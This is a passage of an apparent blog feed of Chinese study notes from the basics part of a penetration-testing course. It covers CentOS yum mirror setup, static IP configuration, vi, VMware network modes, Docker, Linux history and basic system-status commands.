        <content type="html"><![CDATA[<blockquote><p>yum是CentOS中的–种软件管理器,通过yum安装软件，可以自动解决包依赖的问题，免去手工安装依赖包的麻烦。<br>yum使用了一个中心仓库来记录和管理软件的依赖关系,默认为mirrorlist.centos.org,叫做CentOS官方yum源。<br>这个仓库可以类比为手机的应用市场，应用市场也有很多,比如华为应用市场、小米应用市场、应用宝等等。</p></blockquote><p>yum源路径：/etc/yum.repos.d/CentOS-Base.repo</p><p>备份命令:</p><pre><code>cp /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak</code></pre><p>下载阿里云源配置，覆盖原文件<br>命令:</p><pre><code>curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</code></pre><p>3、清理缓存并生成新的缓存<br>命令:</p><pre><code>yum clean allyum makecache</code></pre><p>如果出现”Failed connect to mirrors.aliyuncs.com:80;<br>Connection refused”的错误，重试即可。</p><p>4、更新软件<br>注意:这一步会更新操作系统中所有软件到最新版，不是必<br>要操作。而且网速慢的情况下，会非常耗时，谨慎操作。<br>命令:</p><pre><code>sudo yum -y update</code></pre><p>如果要中断，就按CtrI+C。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时7-3.5.3-CentOS配置静态IP</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-7-3.5.3-centos-pei-zhi-jing-tai-ip/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-7-3.5.3-centos-pei-zhi-jing-tai-ip/</url>
      
        <content type="html"><![CDATA[<p>Centos设置静态IP</p><ul><li>查看物理机IP</li></ul><p>打开cmd,输入ipconfig -all<br>如果你的电脑用的是有线网络，就找到“以太网”的IPv4地址:</p><ul><li>输入命令(复制以后在终端里面Shift+Insert粘贴) :</li></ul><!----><pre><code>vi /etc/sysconfig/network-scripts/ifcfg-ens33</code></pre><p>按回车打开配置文件。</p><pre><code>BOOTPROTO=staticIPADDR=192.168.70.134NETMASK =255.255.255.0DNS1=114.114.114.114GATEWAT=192.168.70.2</code></pre><ul><li>重启网络服务：</li></ul><!----><pre><code>service network restart</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时6-3.5.2-VI编辑器</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-6-3.5.2-vi-bian-ji-qi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-6-3.5.2-vi-bian-ji-qi/</url>
      
        <content type="html"><![CDATA[<p><a name="yX81X"></a></p><h1 id="VI编辑器"><a href="#VI编辑器" class="headerlink" title="VI编辑器"></a>VI编辑器</h1><p>1、命令模式:只能输入命令<br>2、编辑模式(也叫插入模式) :可以修改文本<br><code>i</code><br>3、底行模式:结束操作<br><code>:wq</code></p><p>可能会出现的问题:</p><ol><li>只读权限</li><li>临时swp文件 <a name="JnvqK"></a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时5-3.5.1-安装CentOS</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-5-3.5.1-an-zhuang-centos/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-5-3.5.1-an-zhuang-centos/</url>
      
        <content type="html"><![CDATA[<p><a name="gHAkU"></a></p><h3 id="参考教程"><a href="#参考教程" class="headerlink" title="参考教程"></a>参考教程</h3><p>教程合集<br>01-安装CentOS.pdf<br>02-CentOS静态IP配置pdf<br>03-解压版CentOS使用方法.pdf (推荐)<br>04-CentOS替换yum源为阿里云.pdf</p><p><a name="mYeAl"></a></p><h1 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h1><p>1、镜像来源<br>2、版本: CentOS 7<br>3、root密码设置<br>4、语言选择<br>5、桌面系统</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时4-3.4-VMware三种网络模式</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-4-3.4-vmware-san-chong-wang-luo-mo-shi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-4-3.4-vmware-san-chong-wang-luo-mo-shi/</url>
      
        <content type="html"><![CDATA[<p><a name="XvdD8"></a></p><h1 id="VMware三种网络模式"><a href="#VMware三种网络模式" class="headerlink" title="VMware三种网络模式"></a>VMware三种网络模式</h1><ul><li>桥接模式(Bridge)</li><li>NAT模式(NAT: Network Address Translation),</li><li>仅主机模式(Host-Only) <a name="XyVSn"></a></li></ul><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>网卡<br>路由器<br>交换机</p><p><a name="Jxk2P"></a></p><h1 id="虚拟交换机"><a href="#虚拟交换机" class="headerlink" title="虚拟交换机"></a>虚拟交换机</h1><p>虚拟交换机                 用途<br>VMnet0                 桥接模式<br>VMnet1                 仅主机模式<br>VMnet8                 NAT模式<br>虚拟机交换机的作用:让相同模式的虚拟机相互连接</p><p><a name="Q7euS"></a></p><h1 id="虚拟网卡"><a href="#虚拟网卡" class="headerlink" title="虚拟网卡"></a>虚拟网卡</h1><p>虚拟网卡                                                     用途<br>VMware Network Adapter VMnet1          仅主机模式<br>VMware Network Adapter VMnet8          NAT模式<br>虚拟机网卡的作用:让主机和虚拟机相互连接 <a name="jVTBZ"></a></p><h1 id="关键问题"><a href="#关键问题" class="headerlink" title="关键问题"></a>关键问题</h1><p>1、主机怎么和虚拟机连接?<br>2、虚拟机怎么连接到互联网?</p><p><a name="Bnrvo"></a></p><h2 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h2><p>桥接模式 Bridge 使用主机的网卡</p><p><a name="FMbCX"></a></p><h3 id="桥接-总结2"><a href="#桥接-总结2" class="headerlink" title="桥接-总结2"></a>桥接-总结2</h3><p>连通情况<br>1、主机和虚拟机可以访问.<br>2、虚拟机之间可以相互访问<br>3、可以访问互联网<br>4、可以访问其他主机<br>5、其他主机可以访问本虚拟机<br>使用场景<br>创建一个虚拟服务器在内网提供网络服务 <a name="xcqzX"></a></p><h2 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h2><p>虚拟路由器(NAT设备)<br>vmnet8虚拟交换机 <a name="GmaBS"></a></p><h3 id="NAT-总结1"><a href="#NAT-总结1" class="headerlink" title="NAT-总结1"></a>NAT-总结1</h3><p>通信方式<br>1、虚拟NAT设备(虚拟路由)连接到VMnet8虚拟交换机虚拟机联网用<br>2、主机通过VMware Network Adapter VMnet8虚拟网卡连接到VMnet8虛拟交换机一主机和虚拟机连接用<br>特点<br>1、虚拟机在外部网络中没有自己的IP地址<br>2、虚拟NAT设备会把专用网络中的IP地址转换为主机系统的IP地址一网络地址转换<br>3、主机可以联网，虚拟机就可以联网<br>配置<br>无</p><p><a name="DukC3"></a></p><h2 id="NAT-总结2"><a href="#NAT-总结2" class="headerlink" title="NAT-总结2"></a>NAT-总结2</h2><p>连通情况<br>1、主机和虚拟机可以访问<br>2、虚拟机之间可以相互访问<br>3、可以访问互联网<br>4、本机虚拟机可以访问其他主机<br>5、其他主机不能访问本机虚拟机。解决办法:共享网络、端口映射<br>使用场景<br>大部分情况 <a name="z4lIp"></a></p><h2 id="仅主机模式"><a href="#仅主机模式" class="headerlink" title="仅主机模式"></a>仅主机模式</h2><p>仅主机模式Host Only<br>vmnet1虚拟交换机 <a name="Kqbyg"></a></p><h3 id="仅主机-总结1"><a href="#仅主机-总结1" class="headerlink" title="仅主机-总结1"></a>仅主机-总结1</h3><p>通信方式<br>主机使用VMware Network Adapter VMnet1虚拟网卡连接到VMnet1虚拟交换机<br>特点<br>没有了NAT设备(虚拟路由)，所以不能上网<br>配置<br>无 <a name="z9yAm"></a></p><h3 id="仅主机-总结2"><a href="#仅主机-总结2" class="headerlink" title="仅主机-总结2"></a>仅主机-总结2</h3><p>连通情况<br>1、主机和虚拟机可以访问<br>2、虚拟机之间可以相互访问<br>3、不能访问互联网<br>4、不能访问其他主机<br>5、其他主机不能访问本机虚拟机<br>使用场景<br>创建一个与其他机器隔离的网络</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时3-3.3-安装VMware</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-3-3.3-an-zhuang-vmware/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-3-3.3-an-zhuang-vmware/</url>
      
        <content type="html"><![CDATA[<p><a name="ofPig"></a></p><h2 id="一、操作系统和虚拟机类"><a href="#一、操作系统和虚拟机类" class="headerlink" title="一、操作系统和虚拟机类"></a>一、操作系统和虚拟机类</h2><p>注意:不要直接点击链接,复制到浏览器打开<br>vmare15 pro<br>链接: <a href="https://pan.baidu.com/s/10mYUt5Zn1FqBeqW-7B0-Dg?pwd=8888">https://pan.baidu.com/s/10mYUt5Zn1FqBeqW-7B0-Dg?pwd=8888</a><br>提取码: 8888</p><p>vmware16+注册.zip<br>链接: <a href="https://pan.baidu.com/s/1UpcnqiRv6nUuzO0EOZ22zq?pwd=8888">https://pan.baidu.com/s/1UpcnqiRv6nUuzO0EOZ22zq?pwd=8888</a><br>提取码: 8888<br>备注:如果闪退,可能是和操作系统兼容的问题。可以找一个其他版本</p><p>kali-linux- 2022.1-vmware-amd64 (解压版,推荐)<br>链接:<a href="https://pan.baidu.com/s/1YwrnoGT4DHKpM0ii7v3qag?pwd=8888">https://pan.baidu.com/s/1YwrnoGT4DHKpM0ii7v3qag?pwd=8888</a><br>备注:解压,用VMWare打开就可以使用,用户名和密码都是kali</p><p>CentOS7镜像(解压版)(推荐)<br>链接: <a href="https://pan.baidu.com/s/1-TedxVkWflKgaOepxve4CQ?pwd=8888">https://pan.baidu.com/s/1-TedxVkWflKgaOepxve4CQ?pwd=8888</a><br>提取码: 8888</p><p>CentOS7解压版使用说明<br>链接: <a href="https://pan.baidu.com/s/17iAsPsf5PMmOzyBvrQwCGA">https://pan.baidu.com/s/17iAsPsf5PMmOzyBvrQwCGA</a><a href="https://pan.baidu.com/s/1-TedxVkWflKgaOepxve4CQ?pwd=8888">?pwd=8888</a></p><p>kali官网下载地址:<a href="https://www.kali.org/get-kali/#kali-installer-images">https://www.kali.org/get-kali/#kali-installer-images</a><br>靶场：<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a> <a name="iBjZl"></a></p><h1 id="物理机蓝屏的问题"><a href="#物理机蓝屏的问题" class="headerlink" title="物理机蓝屏的问题"></a>物理机蓝屏的问题</h1><p>虚拟机开机导致物理机蓝屏或重启的问题<br>安装最新版Vmware大概率可以解决<br><a href="https://blog.csdn.net/weixin_55118477/article/details/121080830">https://blog.csdn.net/weixin_55118477/article/details/121080830</a><br><a href="https://blog.csdn.net/wwwwzz/article/details/114682821">https://blog.csdn.net/wwwwzz/article/details/114682821</a> <a name="f9AFd"></a></p><h1 id="VMware基本功能"><a href="#VMware基本功能" class="headerlink" title="VMware基本功能"></a>VMware基本功能</h1><p>打开现有虚拟机<br>编辑网络一 ‘虚拟网络编辑器”<br>虚拟机被锁定<br>克隆和快照<br>与物理机传输文件</p><p><a name="yUKRH"></a></p><h3 id="虚拟机被锁定"><a href="#虚拟机被锁定" class="headerlink" title="虚拟机被锁定"></a>虚拟机被锁定</h3><p>1、原因:启动了多个VMWare程序，在多个窗口打开了一个虚拟机.<br>2、解决办法:找到原来的窗口，或者删除虚拟机目录下所有的.Ick文件和.Ick目录</p><p><a name="mDZoF"></a></p><h3 id="重启或者合上屏幕以后虚拟机连不上"><a href="#重启或者合上屏幕以后虚拟机连不上" class="headerlink" title="重启或者合上屏幕以后虚拟机连不上"></a>重启或者合上屏幕以后虚拟机连不上</h3><p>1、在网络适配器中，禁用VMnet8,再启用就OK了<br>2、可以做成脚本，右键管理员运行</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时2-3.2-Docker容器技术</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-2-3.2-docker-rong-qi-ji-zhu/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-2-3.2-docker-rong-qi-ji-zhu/</url>
      
        <content type="html"><![CDATA[<p><a name="HHzJP"></a></p><h1 id="Docker架构图"><a href="#Docker架构图" class="headerlink" title="Docker架构图"></a>Docker架构图</h1><p><img src="/../../../../assets/bpgfs077azvyfcac_cmy92c/1668227952375-03f16ead-42d8-477c-8657-380da0432700.png" alt="image.png"><br>例如：<a href="https://vulhub.org/">https://vulhub.org/</a> <a name="IBV8o"></a></p><h1 id="Docker特点"><a href="#Docker特点" class="headerlink" title="Docker特点"></a>Docker特点</h1><ul><li>开箱即用</li><li>快速部署</li><li>可移植性强</li><li>环境隔离 <a name="cHoSB"></a></li></ul><h1 id="Docker实现原理"><a href="#Docker实现原理" class="headerlink" title="Docker实现原理"></a>Docker实现原理</h1><ul><li>namespace——系统环境的隔离</li><li>Cgroup——资源限制</li><li>镜像管理文件系统操作——根目录环境的隔离</li></ul><p><a name="AHVUY"></a></p><h1 id="虚拟机和Docker"><a href="#虚拟机和Docker" class="headerlink" title="虚拟机和Docker"></a>虚拟机和Docker</h1><p><img src="/../../../../assets/bpgfs077azvyfcac_cmy92c/1668228835598-dcdde231-cd84-4fb0-a2c1-135e13fb3533.png" alt="image.png"> <a name="xWKEK"></a></p><h1 id="虚拟机和Docker特点对比"><a href="#虚拟机和Docker特点对比" class="headerlink" title="虚拟机和Docker特点对比"></a>虚拟机和Docker特点对比</h1><p><img src="/../../../../assets/bpgfs077azvyfcac_cmy92c/1668228897233-90d5e3ea-6cdd-46e6-b73f-5bebba2f54e1.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-3.1-什么是虚拟机</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-1-3.1-shi-me-shi-xu-ni-ji/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-1-3.1-shi-me-shi-xu-ni-ji/</url>
      
        <content type="html"><![CDATA[<p><a name="tQXOC"></a></p><h2 id="什么是虚拟机"><a href="#什么是虚拟机" class="headerlink" title="什么是虚拟机?"></a>什么是虚拟机?</h2><p><a name="WxFSr"></a></p><h3 id="如何在一台电脑上安装多个操作系统"><a href="#如何在一台电脑上安装多个操作系统" class="headerlink" title="如何在一台电脑上安装多个操作系统?"></a>如何在一台电脑上安装多个操作系统?</h3><p>Virtual Machine。<br>虚拟机/物理机</p><p><a name="Zo9Sg"></a></p><h1 id="虚拟化技术"><a href="#虚拟化技术" class="headerlink" title="虚拟化技术"></a>虚拟化技术</h1><p>虚拟机软件: VMware Workstation、VirtualBox、Virtual PC、Citrix Xen Desktop、Parallels Desktop(MacOS)<br>虚拟化技术: Xen、OpenVZ、 KVM、Hyper-V <a name="vW8Sj"></a></p><h1 id="虚拟机工作原理"><a href="#虚拟机工作原理" class="headerlink" title="虚拟机工作原理"></a>虚拟机工作原理</h1><pre><code>                                                                              虚拟机                虚拟机&lt;br /&gt;                                                                               应用程序              应用程序&lt;br /&gt;                                                                            运行时环境             运行时环境&lt;br /&gt;  应用程序     应用程序                                       虚拟机操作系统      虚拟机操作系统&lt;br /&gt;运行时环境   运行时环境                                                   虚拟机监视器&lt;br /&gt;                                          物理机操作系统&lt;br /&gt;                                                硬件</code></pre><p><a name="ETQdU"></a></p><h1 id="虚拟机使用场景"><a href="#虚拟机使用场景" class="headerlink" title="虚拟机使用场景"></a>虚拟机使用场景</h1><ol><li>运行特定版本操作系统</li><li>隔离物理机，测试用</li><li>提升资源利用率</li></ol><p>Linux自带的虚拟化技术<br>Kernel-based Virtual Machine ( KVM)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时3-2.3-Linux内核与发行版</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-3-2.3-linux-nei-he-yu-fa-xing-ban/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-3-2.3-linux-nei-he-yu-fa-xing-ban/</url>
      
        <content type="html"><![CDATA[<p><a name="IFuqa"></a></p><h1 id="Linux内核"><a href="#Linux内核" class="headerlink" title="Linux内核"></a>Linux内核</h1><ul><li>内核:设备驱动、文件系统、进程管理、网络通信…</li><li><a href="https://www.kernel.org/">https://www.kernel.org/</a></li></ul><!----><pre><code>uname -acat /proc/version</code></pre><p><a name="xwAaM"></a></p><h1 id="内核版本号"><a href="#内核版本号" class="headerlink" title="内核版本号"></a>内核版本号</h1><p>Linux 3.10.0-514.el7.x86 64</p><ul><li>Linux内核名</li><li>第一个组数字: 3, 主版本号</li><li>第二个组数字: 10, 次版本号</li><li>第三个组数字: 0, 修订版本号</li><li>第四个组数字: 514, 发行版本的补丁版本</li><li>el7:表示正在使用的内核是RedHat / CentOS系列发行版</li></ul><p>专用内核( Red Hat Enterprise Linux)</p><ul><li>x86_ 64:采用的是64位的CPU</li></ul><p><a href="https://www.cvedetails.com/">https://www.cvedetails.com/</a></p><p><a name="cI69P"></a></p><h1 id="发行版Distribution"><a href="#发行版Distribution" class="headerlink" title="发行版Distribution"></a>发行版Distribution</h1><p><code>cat /etc/redhat-releaser</code><br>CentOS Linux release 7.3.1611 (Core)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时2-2.2-Linux诞生与分支</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-2-2.2-linux-dan-sheng-yu-fen-zhi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-2-2.2-linux-dan-sheng-yu-fen-zhi/</url>
      
        <content type="html"><![CDATA[<p><a name="GVWl0"></a></p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><ul><li>Linux is not UNIX</li><li>Version 7’Unix-闭源</li><li>Andrew S. Tanenbaum: mini-UNIX= Minix</li><li>Linus Benedict Torvalds: GNU/Linux</li><li>Unix-like systems</li><li>商业/开源;硬件兼容性</li></ul><p><a name="ymoSw"></a></p><h1 id="Unix主要分支"><a href="#Unix主要分支" class="headerlink" title="Unix主要分支"></a>Unix主要分支</h1><p><img src="/../../../../assets/wcpkgksaqqdenytg_cfq9xz/1668390129078-514c756f-50ec-4698-ad33-1f39e68539ca.png" alt="image.png"><br>&amp;#x20;       &amp;#x20;<br><a href="https://upload.wikimedia.org/wikipedia/commons/1/1b/Linux_Distribution_Timel%20ine.svg">linux分支</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-2.1-操作系统简史</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-1-2.1-cao-zuo-xi-tong-jian-shi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-1-2.1-cao-zuo-xi-tong-jian-shi/</url>
      
        <content type="html"><![CDATA[<p><a name="IJKHw"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><p>1、操作系统简史<br>2、Linux诞生与分支<br>3、Linux内核与发行版</p><p><a name="SEgXO"></a></p><h1 id="40年代"><a href="#40年代" class="headerlink" title="40年代"></a>40年代</h1><p>ENIAC<br>穿孔卡片</p><p><a name="yGuH0"></a></p><h1 id="50年代"><a href="#50年代" class="headerlink" title="50年代"></a>50年代</h1><ul><li>计算机读取内存…编程语言、可重用代码、汇编程序、中断</li><li>批处理系统</li><li>1956第一个操作系统GM-NAA I/O <a name="dbpF2"></a></li></ul><h1 id="60年代"><a href="#60年代" class="headerlink" title="60年代"></a>60年代</h1><ul><li>多程序、多处理器操作系统、交互式操作</li><li>DOS: Disk Operating System</li><li>小型计算机、分时系统、虚拟内存和多处理、顺序作业系统、多作业系统</li><li>鼠标和UNIX操作系统</li><li>MULTICS (MULTiplexed Information and Computing System多路信息计算系统)</li><li>肯汤普森(Ken Thompson)</li><li>Unics (Uniplexed Information and Computing System 单路信息计算系统)</li></ul><p><a name="K6I72"></a></p><h1 id="70年代"><a href="#70年代" class="headerlink" title="70年代"></a>70年代</h1><ul><li>Ken Thompson (肯●汤普森)、Dennis Ritchie (丹尼斯●里奇)</li><li>C语言</li><li>Unix: 多用户，多任务处理、虚拟内存</li><li>数据网络和微处理器 <a name="BV5Ye"></a></li></ul><h1 id="Windows、MacOS"><a href="#Windows、MacOS" class="headerlink" title="Windows、MacOS"></a>Windows、MacOS</h1><ul><li>MicroSoft: QDOS–MS-DOS</li><li>Apple: Macintosh+ System 1.0</li><li>1985年Windows 1.0 <a name="AMHnO"></a></li></ul><h1 id="Xerox"><a href="#Xerox" class="headerlink" title="Xerox"></a>Xerox</h1><p>施乐(Xerox) 奥托(Alto) 一John Ellenby</p><p><a name="h7xq6"></a></p><h1 id="Linux图形界面"><a href="#Linux图形界面" class="headerlink" title="Linux图形界面"></a>Linux图形界面</h1><p>KDE、GNOME、Xfce、LXDE、MATE</p><blockquote><p>echo $DESKTOP_SESSION<br>echo $GDMSESSION<br>ps -A | egrep -i “gnome|kde|mate|cinnamon|lx|xfceljwm”</p></blockquote><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿guoyx)-[~/Desktop]└─# echo $DESKTOP_SESSION                                 lightdm-xsession<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿guoyx)-[~/Desktop]└─# echo $GDMSESSION            lightdm-xsession<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿guoyx)-[~/Desktop]└─# ps -A | egrep -i "gnome|kde|mate|cinnamon|lx|xfceljwm"    110 ?        00:00:00 kdevtmpfs   1182 ?        00:00:00 polkit-gnome-au  71326 ?        00:00:00 gnome-keyring-d  71338 ?        00:00:00 gnome-keyring-d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-12-Linux系统状态管理</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-12-xi-tong-zhuang-tai-guan-li/ke-shi-1-12-linux-xi-tong-zhuang-tai-guan-li/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-12-xi-tong-zhuang-tai-guan-li/ke-shi-1-12-linux-xi-tong-zhuang-tai-guan-li/</url>
      
        <content type="html"><![CDATA[<p><a name="MluS0"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>查看系统信息</li><li>进程管理</li><li>内存使用情况</li><li>磁盘使用情况</li><li>定时任务</li></ol><p><a name="ow2y5"></a></p><h1 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h1><p>1.日期时间<br><code>date</code>时间</p><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# date "+%Y-%m-%d %H:%M:%S"2022-11-14 01:18:46</code></pre><p><code>cal</code> 日历</p><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# cal   November 2022      Su Mo Tu We Th Fr Sa         1  2  3  4  5   6  7  8  9 10 11 12  13 14 15 16 17 18 19  20 21 22 23 24 25 26  27 28 29 30     </code></pre><p><code>uptime</code> 开机启动多少时间</p><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# uptime 01:21:49 up 18:42,  2 users,  load average: 0.00, 0.00, 0.00</code></pre><p><code>w</code>显示目前登入系统的用户信息</p><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# w 01:22:04 up 18:42,  2 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty7     :0               Sun06   18:42m  2:02   2:02  /usr/lib/xorg/Xorgkali     pts/0    192.168.31.119   00:25    0.00s  0.45s  0.04s sshd: kali [priv]</code></pre><p>2.系统版本<br><code>cat /etc/redhat-release</code></p><pre><code>[root@xuegod63 ~]# cat /etc/redhat-releaseCentOS Linux release 7.9.2009 (Core)</code></pre><p><code>uname -a</code></p><pre><code>[root@xuegod63 ~]# uname -aLinux xuegod63.cn 3.10.0-1160.80.1.el7.x86_64 #1 SMP Tue Nov 8 15:48:59 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p><code>cat /proc/version</code></p><pre><code>[root@xuegod63 ~]# cat /proc/versionLinux version 3.10.0-1160.80.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Tue Nov 8 15:48:59 UTC 2022</code></pre><p><a name="RRRQj"></a></p><h1 id="程序、进程、服务"><a href="#程序、进程、服务" class="headerlink" title="程序、进程、服务"></a>程序、进程、服务</h1><ol><li>程序 program</li><li>进程 process</li><li>服务 service</li></ol><p><code>systemctl list-unit-files |grep mysql</code><br><code>cat /etc/services |grep mysql</code> <a name="LAUyq"></a></p><h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><ol><li>前台运行 ./xxx</li><li>后台运行 nohup ./xxx &amp; <a name="GdKgK"></a></li></ol><h2 id="查看进程top"><a href="#查看进程top" class="headerlink" title="查看进程top"></a>查看进程top</h2><p><img src="/../../../../assets/sz2bq1c30ov5kna7_unc00d/1668408271232-cbf3da58-1d61-4a0e-a544-8a3a34e74022.png" alt="image.png"> <a name="kjRle"></a></p><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p>全拼: process status</p><table><thead><tr><th>选项</th><th>作用</th></tr></thead><tbody><tr><td>-a</td><td>显示所有进程，包括其他用户的进程;</td></tr><tr><td>-u</td><td>选择有效的用户id或者是用户名;</td></tr><tr><td>-x</td><td>显示没有控制终端的进程，同时显示各个命令的具体路径</td></tr><tr><td>-e</td><td>显示所有的进程，和-A的效果一样;</td></tr><tr><td>-f</td><td>显示更完整;通常与-e一起用;</td></tr></tbody></table><p><a name="MlmKr"></a></p><h3 id="ps-ef"><a href="#ps-ef" class="headerlink" title="ps -ef"></a>ps -ef</h3><p><img src="/../../../../assets/sz2bq1c30ov5kna7_unc00d/1668408710813-5942bcd8-dddb-4dc3-8cad-8f19ffd19424.png" alt="image.png"><br><code>ps -ef | grep mysql</code> <a name="rOLJH"></a></p><h3 id="ps-aux"><a href="#ps-aux" class="headerlink" title="ps -aux"></a>ps -aux</h3><p><img 